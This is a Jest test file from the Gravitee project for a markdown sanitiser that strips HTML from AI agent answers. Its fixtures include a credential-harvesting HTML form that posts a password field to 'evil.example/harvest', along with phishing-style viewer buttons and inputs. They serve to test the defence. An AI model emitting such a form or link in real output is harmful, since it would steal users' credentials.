/*
 * Copyright (C) 2024 The Gravitee team (http://gravitee.io)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
import { markdownWithoutHtml } from './agent-markdown';

describe('markdownWithoutHtml', () => {
  it('strips a credential-harvesting form but keeps its visible text', () => {
    const hostile =
      'Please sign in:\n<form action="https://evil.example/harvest" method="POST"><input type="password" name="p"><button type="submit">Sign in</button></form>';

    const safe = markdownWithoutHtml(hostile);

    expect(safe).not.toContain('<form');
    expect(safe).not.toContain('<input');
    expect(safe).not.toContain('evil.example');
    expect(safe).toContain('Please sign in:');
  });

  it('strips the markdown viewer own interactive components', () => {
    const safe = markdownWithoutHtml('<gmd-button link="https://evil.example">Verify</gmd-button>');

    expect(safe).not.toContain('gmd-button');
    expect(safe).toContain('Verify');
  });

  it('keeps entity-escaped markup escaped instead of reviving it', () => {
    const hostile = '&lt;gmd-button link="https://evil.example" target="_blank"&gt;Verify your account&lt;/gmd-button&gt;';

    const safe = markdownWithoutHtml(hostile);

    expect(safe).not.toContain('<gmd-button');
    expect(safe).not.toContain('<input');
  });

  it('keeps an entity-escaped input out of the viewer', () => {
    const safe = markdownWithoutHtml('&lt;gmd-input fieldkey="password"&gt;&lt;/gmd-input&gt;');

    expect(safe).not.toContain('<gmd-input');
  });

  it('leaves headings, lists, emphasis and tables alone', () => {
    const markdown = '# Title\n\n- one\n- two\n\n**bold** and `code`\n\n| a | b |\n| --- | --- |\n| 1 | 2 |';

    expect(markdownWithoutHtml(markdown)).toBe(markdown);
  });

  it('leaves a blockquote alone, so the > is not turned into an entity', () => {
    expect(markdownWithoutHtml('> quoted line')).toBe('> quoted line');
  });

  it('leaves a bare comparison alone', () => {
    expect(markdownWithoutHtml('use a < b and c > d')).toBe('use a < b and c > d');
  });

  it('leaves a link alone', () => {
    expect(markdownWithoutHtml('[docs](https://example.test/docs)')).toBe('[docs](https://example.test/docs)');
  });

  it('passes an empty answer through', () => {
    expect(markdownWithoutHtml('')).toBe('');
  });
});
